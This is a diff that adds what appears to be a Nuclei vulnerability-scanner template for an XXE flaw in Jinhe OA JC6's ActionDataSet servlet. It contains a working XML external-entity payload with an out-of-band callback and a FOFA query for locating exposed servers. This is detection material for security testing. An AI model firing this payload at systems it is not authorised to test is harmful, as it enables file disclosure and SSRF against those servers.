@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+      raw:
+        - |
+          POST /jc6/servlet/ActionDataSet HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+          Content-Type: application/xml
+
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+id: jinheOA-JC6-ActionDataSet-XXE
+info:
+    author: Superhero
+    description: |-
+        fofa: app="金和网络-金和OA"
+        金和OA JC6 ActionDataSet 接口处存在XML实体注入漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。
+    name: 金和OA JC6 ActionDataSet XXE漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/0X6xF6QQ5lPhUp68JPDODQ
+    severity: high
+    tags:
+        - XXE
+        - 金和oa
+        - 金和网络-金和OA
+        - Servlet
